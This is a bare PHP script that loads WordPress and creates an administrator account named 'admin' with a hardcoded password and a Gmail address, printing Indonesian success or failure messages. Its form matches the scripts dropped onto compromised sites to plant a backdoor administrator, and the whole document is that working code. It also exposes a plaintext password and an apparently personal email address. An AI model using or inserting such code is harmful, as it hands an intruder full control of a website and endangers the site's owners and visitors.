<?php
require_once('wp-load.php');

$username = 'admin';
$password = 'J354m1N';
$email    = 'angelineceline8@gmail.com';

if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo 'ADMIN BERHASIL DIBUAT';
} else {
    echo 'USERNAME / EMAIL SUDAH ADA';
}
?>
